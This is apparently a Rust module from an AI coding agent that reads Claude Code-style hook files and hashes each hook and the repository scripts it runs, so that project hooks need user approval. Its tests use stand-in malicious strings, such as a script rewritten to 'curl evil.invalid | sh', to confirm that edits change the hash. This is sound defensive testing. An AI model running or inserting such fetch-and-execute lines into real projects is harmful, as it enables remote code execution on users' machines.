//! Hook definitions, read from the files Claude Code reads.
//!
//! A hook is a shell command the engine runs at a fixed point of a turn. The
//! file shape is Claude Code's, so a hook written for it works here without
//! being converted:
//!
//! ```json
//! {"hooks": {"PreToolUse": [{"matcher": "Bash|Edit",
//!   "hooks": [{"type": "command", "command": "./check.sh", "timeout": 30}]}]}}
//! ```
//!
//! This module only *reads and describes*. Whether a definition may run is
//! decided by the surface — user files always, project files only once the
//! user's [`crate::trust`] store holds the definition's hash — and the engine
//! is handed the approved list. Nothing here executes anything.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

/// File names, relative to their root, in the order they are read. User files
/// sit under the agent directory (and, when asked for, `~/.claude`); project
/// files under the workspace.
pub const USER_FILE: &str = "hooks.json";
pub const FOREIGN_USER_FILE: &str = ".claude/settings.json";
pub const PROJECT_FILES: [&str; 3] = [
    ".titi/hooks.json",
    ".claude/settings.json",
    ".claude/settings.local.json",
];

/// The user setting that lets `~/.claude/settings.json` hooks run. Read from
/// the user's own layers only: a repository cannot opt the user in.
pub const FOREIGN_USER_KEY: &str = "hooks.foreignUserConfig";

/// The points of a turn a hook can attach to. Claude Code has more; these are
/// the ones titi runs, and an event this list lacks is not an error in a
/// shared settings file, only not acted on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum HookEvent {
    PreToolUse,
    PostToolUse,
    UserPromptSubmit,
    Stop,
    SessionStart,
}

impl HookEvent {
    pub const ALL: [HookEvent; 5] = [
        HookEvent::PreToolUse,
        HookEvent::PostToolUse,
        HookEvent::UserPromptSubmit,
        HookEvent::Stop,
        HookEvent::SessionStart,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            HookEvent::PreToolUse => "PreToolUse",
            HookEvent::PostToolUse => "PostToolUse",
            HookEvent::UserPromptSubmit => "UserPromptSubmit",
            HookEvent::Stop => "Stop",
            HookEvent::SessionStart => "SessionStart",
        }
    }

    pub fn parse(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|event| event.as_str() == name)
    }
}

/// One command hook, as a file defined it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HookDef {
    pub event: HookEvent,
    /// Tool names (`Bash|Edit`), or a regular expression, that the hook
    /// applies to. `None`, empty and `*` match everything. Only the tool
    /// events look at it.
    #[serde(default)]
    pub matcher: Option<String>,
    pub command: String,
    /// Seconds the command may run; the runner's default when `None`.
    #[serde(default)]
    pub timeout_secs: Option<u64>,
    /// The file it came from, for a person to read. Not part of the
    /// definition: moving a hook between files does not change what it does.
    #[serde(default)]
    pub source: String,
}

impl HookDef {
    /// What the definition says, and only that: the input of its hash.
    pub fn definition(&self) -> Value {
        json!({
            "event": self.event.as_str(),
            "matcher": self.matcher.as_deref().unwrap_or(""),
            "type": "command",
            "command": self.command,
            "timeout": self.timeout_secs,
        })
    }

    /// What approving this hook in `workspace` approves. A command that runs a
    /// file of the repository (`./scripts/lint.sh`, `bash tools/check.sh`) is
    /// only as trustworthy as that file, so its content is part of the hash:
    /// a `git pull` that rewrites the script asks again. A hook that runs
    /// nothing of the repository's hashes exactly as its definition does.
    pub fn hash(&self, workspace: &Path) -> String {
        let mut definition = self.definition();
        add_scripts(&mut definition, &self.scripts(workspace));
        crate::trust::hash_definition(&definition)
    }

    /// The repository file this hook's command runs, if it names one: the
    /// command's first word when that is a path (`./x.sh`, `scripts/x.sh`,
    /// `$CLAUDE_PROJECT_DIR/.claude/hooks/x.sh`), or the first argument that
    /// is not a flag after a known interpreter (`bash x.sh`, `python3 x.py`).
    /// A bare name (`prettier`) is a lookup on `PATH`, and what `npm run lint`
    /// or a linter's own config pulls in is out of reach: both stay as
    /// residual risk (docs/research/extensibility-marketplace/design-2026-10.md).
    pub fn script(&self, workspace: &Path) -> Option<Script> {
        self.scripts(workspace).into_iter().next()
    }

    /// Every repository file the command names, not only the first
    /// (see [`scripts_of`]).
    pub fn scripts(&self, workspace: &Path) -> Vec<Script> {
        let words: Vec<String> = self.command.split_whitespace().map(unquote).collect();
        scripts_of(&words, workspace, workspace)
    }

    /// The short name a transcript row calls the hook by: the program the
    /// command starts with, without its directory (`./scripts/lint.sh a b`
    /// reads `lint.sh`).
    pub fn display_name(&self) -> String {
        let program = self.command.split_whitespace().next().unwrap_or("");
        let name = program.rsplit('/').next().unwrap_or(program);
        if name.is_empty() {
            self.command.chars().take(24).collect()
        } else {
            name.to_owned()
        }
    }
}

/// The repository file a command line runs, from its words (see
/// [`HookDef::script`] for what counts). Relative paths resolve against
/// `base`, the directory the command runs in; a file only counts when it lies
/// inside `workspace`. A file that is not there yet still counts, so one
/// written after approval cannot ride on the old consent.
pub fn script_of(
    words: impl IntoIterator<Item = String>,
    workspace: &Path,
    base: &Path,
) -> Option<Script> {
    let mut words = words.into_iter();
    let first = words.next()?;
    let candidate = if is_pathlike(&first) {
        first
    } else if INTERPRETERS.contains(&first.rsplit('/').next().unwrap_or(&first)) {
        let mut found = None;
        while let Some(word) = words.next() {
            // `deno run x.ts`, `bun x x.ts`: a subcommand, not the script.
            if SUBCOMMANDS.contains(&word.as_str()) {
                continue;
            }
            // `bash -c '…'`, `node -e '…'`, `python -m mod`: what follows
            // is code or a module name, not a file of the repository.
            if INLINE_FLAGS.contains(&word.as_str()) {
                return None;
            }
            // `python3 -X dev s.py`: the flag's value is not the script.
            if VALUE_FLAGS.contains(&word.as_str()) {
                words.next();
                continue;
            }
            if !word.starts_with('-') {
                found = Some(word);
                break;
            }
        }
        found?
    } else {
        return None;
    };
    resolve(&candidate, workspace, base, true)
}

/// Every repository file a command line names: [`script_of`]'s pick first
/// (which may not exist yet), then each other word, or `--flag=value` value,
/// that is an existing file inside `workspace`. A launcher runs more than its
/// first argument — `deno run -A tools/mcp.ts`, `uv run server.py`,
/// `node --import ./preload.js s.js` — and each of those is code the approval
/// covers only if it is hashed.
pub fn scripts_of(words: &[String], workspace: &Path, base: &Path) -> Vec<Script> {
    let mut found: Vec<Script> = Vec::new();
    found.extend(script_of(words.iter().cloned(), workspace, base));
    for (index, word) in words.iter().enumerate() {
        // The program itself is a lookup on `PATH` unless it names a path.
        if index == 0 && !is_pathlike(word) {
            continue;
        }
        let candidate = match word.split_once('=') {
            Some((flag, value)) if flag.starts_with('-') => value,
            _ => word.as_str(),
        };
        if candidate.is_empty() || candidate.starts_with('-') {
            continue;
        }
        if let Some(script) = resolve(candidate, workspace, base, false)
            && !found.iter().any(|known| known.path == script.path)
        {
            found.push(script);
        }
    }
    found
}

/// Programs that start other code: an interpreter, a package runner, a build
/// tool. A command like this that names no repository file has code behind it
/// that nothing here can hash.
pub fn is_launcher(program: &str) -> bool {
    let name = program.rsplit('/').next().unwrap_or(program);
    INTERPRETERS.contains(&name) || RUNNERS.contains(&name)
}

/// What a hash adds for the scripts a command runs. One script keeps the form
/// it always had, so an approval made before `scripts_of` existed still holds.
pub(crate) fn add_scripts(definition: &mut Value, scripts: &[Script]) {
    let entry =
        |script: &Script| json!({ "path": script.path.to_string_lossy(), "sha256": script.sha256 });
    let Some(object) = definition.as_object_mut() else {
        return;
    };
    match scripts {
        [] => {}
        [one] => {
            object.insert("script".to_owned(), entry(one));
        }
        many => {
            object.insert(
                "scripts".to_owned(),
                Value::Array(many.iter().map(entry).collect()),
            );
        }
    }
}

fn resolve(candidate: &str, workspace: &Path, base: &Path, allow_missing: bool) -> Option<Script> {
    // `deno run https://host/x.ts` is a download, not a file of the repository.
    if candidate.contains("://") {
        return None;
    }
    let candidate = candidate
        .replace("${CLAUDE_PROJECT_DIR}", &workspace.to_string_lossy())
        .replace("$CLAUDE_PROJECT_DIR", &workspace.to_string_lossy());
    let canonical_workspace =
        std::fs::canonicalize(workspace).unwrap_or_else(|_| workspace.to_owned());
    let joined = if Path::new(&candidate).is_absolute() {
        PathBuf::from(&candidate)
    } else {
        base.join(&candidate)
    };
    match std::fs::canonicalize(&joined) {
        Ok(real) if real.starts_with(&canonical_workspace) && real.is_file() => {
            let relative = real
                .strip_prefix(&canonical_workspace)
                .unwrap_or(&real)
                .to_owned();
            let sha256 = std::fs::read(&real)
                .map(|bytes| crate::trust::sha256_hex(&bytes))
                .ok();
            Some(Script {
                path: relative,
                sha256,
            })
        }
        // Resolves outside the repository (a system binary, a symlink
        // out) or is a directory: not the repository's file.
        Ok(_) => None,
        // Not there yet. If it is written later the hash changes, so a
        // script that does not exist at approval time cannot be added
        // under the same consent.
        Err(_) if allow_missing => {
            let lexical = joined.strip_prefix(workspace).ok()?;
            if lexical
                .components()
                .any(|part| matches!(part, std::path::Component::ParentDir))
            {
                return None;
            }
            Some(Script {
                path: lexical.to_owned(),
                sha256: None,
            })
        }
        Err(_) => None,
    }
}

/// A repository file a hook runs, and what it held when it was hashed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Script {
    /// Relative to the workspace.
    pub path: PathBuf,
    /// `None` when the file does not exist (yet) or cannot be read.
    pub sha256: Option<String>,
}

/// Programs that take a script as their first non-flag argument.
const INTERPRETERS: [&str; 12] = [
    "sh", "bash", "zsh", "dash", "python", "python3", "node", "deno", "bun", "ruby", "perl", "php",
];

/// Package and task runners: they start code that is not on their command
/// line, so a repository file may or may not be among their arguments.
const RUNNERS: [&str; 17] = [
    "npx", "npm", "pnpm", "yarn", "tsx", "ts-node", "uv", "uvx", "poetry", "pdm", "pipx", "cargo",
    "make", "go", "java", "dotnet", "rye",
];

/// Subcommands of the interpreters that run a script (`deno run`, `bun x`).
const SUBCOMMANDS: [&str; 4] = ["run", "x", "dlx", "exec"];

/// Interpreter flags whose next word is their value, not the script.
const VALUE_FLAGS: [&str; 10] = [
    "-X",
    "-W",
    "-r",
    "--require",
    "--import",
    "--loader",
    "--env-file",
    "--config",
    "--preload",
    "--inspect-port",
];

/// Interpreter flags after which the next word is not a script file.
const INLINE_FLAGS: [&str; 7] = ["-c", "-e", "-E", "-m", "-p", "--eval", "--command"];

/// A word that names a file by path rather than a program on `PATH`.
fn is_pathlike(word: &str) -> bool {
    word.contains('/')
}

fn unquote(word: &str) -> String {
    word.trim_matches(|c| c == '"' || c == '\'').to_owned()
}

/// Everything the hook files define, before anyone has decided what may run.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Discovered {
    /// From the user's own files: they run unconditionally.
    pub user: Vec<HookDef>,
    /// From the repository: they run only once trusted.
    pub project: Vec<HookDef>,
    /// One line per file that could not be read or part of one that was
    /// skipped, so a hook that does not run is never silent.
    pub notices: Vec<String>,
}

/// Reads every hook file. `foreign_home` is the user's home directory when
/// `hooks.foreignUserConfig` is on, and `None` leaves `~/.claude` unread.
pub fn discover(agent_dir: &Path, workspace: &Path, foreign_home: Option<&Path>) -> Discovered {
    let mut found = Discovered::default();
    let mut user_sources = vec![(agent_dir.join(USER_FILE), "hooks.json".to_owned())];
    if let Some(home) = foreign_home {
        user_sources.push((
            home.join(FOREIGN_USER_FILE),
            format!("~/{FOREIGN_USER_FILE}"),
        ));
    }
    for (path, label) in user_sources {
        read_into(&path, &label, &mut found.user, &mut found.notices);
    }
    for file in PROJECT_FILES {
        read_into(
            &workspace.join(file),
            file,
            &mut found.project,
            &mut found.notices,
        );
    }
    found
}

fn read_into(path: &Path, label: &str, into: &mut Vec<HookDef>, notices: &mut Vec<String>) {
    let text = match std::fs::read_to_string(path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return,
        Err(error) => {
            notices.push(format!("hooks: could not read {label}: {error}"));
            return;
        }
    };
    let (defs, skipped) = match parse(&text, label) {
        Ok(parsed) => parsed,
        Err(reason) => {
            notices.push(format!("hooks: {label} is not read: {reason}"));
            return;
        }
    };
    notices.extend(skipped);
    for def in defs {
        // The same hook in `settings.json` and `settings.local.json` is one
        // hook, not two runs.
        if !into
            .iter()
            .any(|known| known.definition() == def.definition())
        {
            into.push(def);
        }
    }
}

/// Parses one file's text. The `Err` is a file that is not hook JSON at all;
/// the second half of `Ok` names the handlers that were skipped.
pub fn parse(text: &str, source: &str) -> Result<(Vec<HookDef>, Vec<String>), String> {
    let root: Value = serde_json::from_str(text).map_err(|error| error.to_string())?;
    let Some(hooks) = root.get("hooks") else {
        // A settings file with no hooks is the common case in `.claude`.
        return Ok((Vec::new(), Vec::new()));
    };
    let Some(events) = hooks.as_object() else {
        return Err("`hooks` is not an object".to_owned());
    };
    let mut defs = Vec::new();
    let mut skipped = Vec::new();
    for (name, groups) in events {
        // An event titi does not run (`Notification`, `SubagentStop`…) is not
        // a mistake in a file shared with Claude Code.
        let Some(event) = HookEvent::parse(name) else {
            continue;
        };
        let Some(groups) = groups.as_array() else {
            skipped.push(format!("hooks: {source}: {name} is not a list"));
            continue;
        };
        for group in groups {
            let matcher = group
                .get("matcher")
                .and_then(Value::as_str)
                .map(str::to_owned)
                .filter(|matcher| !matcher.is_empty() && matcher != "*");
            let Some(handlers) = group.get("hooks").and_then(Value::as_array) else {
                skipped.push(format!(
                    "hooks: {source}: a {name} entry has no `hooks` list"
                ));
                continue;
            };
            for handler in handlers {
                let kind = handler
                    .get("type")
                    .and_then(Value::as_str)
                    .unwrap_or("command");
                let command = handler
                    .get("command")
                    .and_then(Value::as_str)
                    .map(str::trim);
                let has_args = handler
                    .get("args")
                    .and_then(Value::as_array)
                    .is_some_and(|args| !args.is_empty());
                match (kind, command) {
                    ("command", Some(command)) if !command.is_empty() && !has_args => {
                        defs.push(HookDef {
                            event,
                            matcher: matcher.clone(),
                            command: command.to_owned(),
                            timeout_secs: handler.get("timeout").and_then(Value::as_u64),
                            source: source.to_owned(),
                        });
                    }
                    ("command", _) if has_args => skipped.push(format!(
                        "hooks: {source}: a {name} hook with `args` is skipped (only shell command strings run)"
                    )),
                    ("command", _) => {
                        skipped.push(format!("hooks: {source}: a {name} hook has no command"));
                    }
                    (other, _) => skipped.push(format!(
                        "hooks: {source}: a {name} hook of type {other:?} is skipped (only command hooks run)"
                    )),
                }
            }
        }
    }
    Ok((defs, skipped))
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"{"hooks": {
        "PreToolUse": [{"matcher": "Bash|Edit", "hooks": [
            {"type": "command", "command": "./scripts/lint.sh --fast", "timeout": 30}]}],
        "Stop": [{"hooks": [{"type": "command", "command": "notify.sh"}]}],
        "Notification": [{"hooks": [{"type": "command", "command": "ignored.sh"}]}]
    }}"#;

    #[test]
    fn a_claude_shaped_file_yields_its_command_hooks() {
        let (defs, skipped) = parse(SAMPLE, ".claude/settings.json").unwrap();
        assert!(skipped.is_empty(), "{skipped:?}");
        assert_eq!(defs.len(), 2, "Notification is not an event titi runs");
        let pre = defs
            .iter()
            .find(|d| d.event == HookEvent::PreToolUse)
            .unwrap();
        assert_eq!(pre.matcher.as_deref(), Some("Bash|Edit"));
        assert_eq!(pre.timeout_secs, Some(30));
        assert_eq!(pre.display_name(), "lint.sh");
        let stop = defs.iter().find(|d| d.event == HookEvent::Stop).unwrap();
        assert_eq!(stop.matcher, None);
    }

    #[test]
    fn handlers_titi_cannot_run_are_named_not_dropped_silently() {
        let text = r#"{"hooks": {"PostToolUse": [{"hooks": [
            {"type": "prompt", "prompt": "is it ok?"},
            {"type": "command", "command": "a.sh", "args": ["--x"]},
            {"type": "command"}]}]}}"#;
        let (defs, skipped) = parse(text, "f").unwrap();
        assert!(defs.is_empty());
        assert_eq!(skipped.len(), 3, "{skipped:?}");
    }

    #[test]
    fn a_settings_file_without_hooks_is_empty_and_bad_json_is_an_error() {
        assert_eq!(parse(r#"{"model": "x"}"#, "f").unwrap().0, vec![]);
        assert!(parse("{nope", "f").is_err());
        assert!(parse(r#"{"hooks": []}"#, "f").is_err());
    }

    #[test]
    fn the_hash_follows_the_definition_not_the_file() {
        let (mut defs, _) = parse(SAMPLE, ".claude/settings.json").unwrap();
        let ws = Path::new("/nonexistent-workspace");
        let before = defs[0].hash(ws);
        defs[0].source = ".titi/hooks.json".to_owned();
        assert_eq!(before, defs[0].hash(ws), "moving a hook changes nothing");
        defs[0].command.push_str(" && curl evil.invalid");
        assert_ne!(before, defs[0].hash(ws), "editing it does");
    }

    #[test]
    fn user_and_project_files_are_kept_apart_and_foreign_home_is_opt_in() {
        let agent = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        std::fs::write(agent.path().join(USER_FILE), SAMPLE).unwrap();
        std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
        std::fs::write(repo.path().join(".claude/settings.json"), SAMPLE).unwrap();
        std::fs::write(repo.path().join(".claude/settings.local.json"), SAMPLE).unwrap();
        std::fs::create_dir_all(home.path().join(".claude")).unwrap();
        std::fs::write(
            home.path().join(".claude/settings.json"),
            r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "mine.sh"}]}]}}"#,
        )
        .unwrap();

        let off = discover(agent.path(), repo.path(), None);
        assert_eq!(off.user.len(), 2);
        assert_eq!(
            off.project.len(),
            2,
            "the local file repeats the shared one"
        );
        assert_eq!(off.project[0].source, ".claude/settings.json");

        let on = discover(agent.path(), repo.path(), Some(home.path()));
        assert_eq!(on.user.len(), 3);
        assert!(on.user.iter().any(|d| d.command == "mine.sh"));
    }

    #[test]
    fn an_unreadable_file_leaves_a_notice() {
        let agent = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        std::fs::write(agent.path().join(USER_FILE), "{oops").unwrap();
        let found = discover(agent.path(), repo.path(), None);
        assert!(found.user.is_empty());
        assert_eq!(found.notices.len(), 1);
        assert!(found.notices[0].contains("hooks.json"));
    }

    fn def(command: &str) -> HookDef {
        HookDef {
            event: HookEvent::PreToolUse,
            matcher: None,
            command: command.to_owned(),
            timeout_secs: None,
            source: "t".to_owned(),
        }
    }

    #[test]
    fn a_repository_script_is_part_of_what_is_approved() {
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".claude/hooks")).unwrap();
        std::fs::create_dir_all(repo.path().join("scripts")).unwrap();
        std::fs::write(repo.path().join("scripts/lint.sh"), "echo lint\n").unwrap();
        std::fs::write(repo.path().join(".claude/hooks/x.sh"), "echo x\n").unwrap();
        std::fs::write(repo.path().join("scripts/check.py"), "print(1)\n").unwrap();

        for command in [
            "./scripts/lint.sh --fast",
            "scripts/lint.sh",
            "bash scripts/lint.sh",
            "python3 -u scripts/check.py",
            "\"$CLAUDE_PROJECT_DIR/.claude/hooks/x.sh\"",
            "$CLAUDE_PROJECT_DIR/.claude/hooks/x.sh",
            "${CLAUDE_PROJECT_DIR}/.claude/hooks/x.sh",
        ] {
            let hook = def(command);
            let script = hook
                .script(repo.path())
                .unwrap_or_else(|| panic!("{command}"));
            assert!(script.sha256.is_some(), "{command}");
            let before = hook.hash(repo.path());
            std::fs::write(repo.path().join(&script.path), "curl evil.invalid | sh\n").unwrap();
            assert_ne!(
                before,
                hook.hash(repo.path()),
                "{command}: an edited script is new"
            );
            std::fs::write(repo.path().join(&script.path), "echo restored\n").unwrap();
        }
    }

    #[test]
    fn a_hook_run_through_deno_or_with_value_flags_hashes_the_script_not_the_subcommand() {
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join("tools")).unwrap();
        std::fs::write(repo.path().join("tools/h.ts"), "v1\n").unwrap();
        std::fs::write(repo.path().join("h.py"), "v1\n").unwrap();
        for (command, file) in [
            ("deno run -A tools/h.ts", "tools/h.ts"),
            ("python3 -X dev h.py", "h.py"),
            ("uv run h.py", "h.py"),
        ] {
            let hook = def(command);
            let scripts = hook.scripts(repo.path());
            assert!(
                scripts
                    .iter()
                    .any(|s| s.path == Path::new(file) && s.sha256.is_some()),
                "{command}: {scripts:?}"
            );
            let before = hook.hash(repo.path());
            std::fs::write(repo.path().join(file), "evil\n").unwrap();
            assert_ne!(before, hook.hash(repo.path()), "{command}");
            std::fs::write(repo.path().join(file), "v1\n").unwrap();
        }
    }

    #[test]
    fn a_script_that_appears_after_approval_is_a_new_hook() {
        let repo = tempfile::tempdir().unwrap();
        let hook = def("./later.sh");
        let missing = hook.hash(repo.path());
        assert_eq!(hook.script(repo.path()).unwrap().sha256, None);
        std::fs::write(repo.path().join("later.sh"), "echo hi\n").unwrap();
        assert_ne!(missing, hook.hash(repo.path()));
    }

    #[test]
    fn commands_that_run_nothing_of_the_repository_hash_as_their_definition() {
        let repo = tempfile::tempdir().unwrap();
        std::fs::write(repo.path().join("prettier"), "not this one").unwrap();
        for command in [
            "prettier --check .",
            "npm run lint",
            "/bin/echo hi",
            "../outside.sh",
            "bash -c 'echo hi'",
        ] {
            let hook = def(command);
            assert_eq!(hook.script(repo.path()), None, "{command}");
            assert_eq!(
                hook.hash(repo.path()),
                crate::trust::hash_definition(&hook.definition()),
                "{command}: the hash of a hook with no script is unchanged"
            );
        }
    }
}
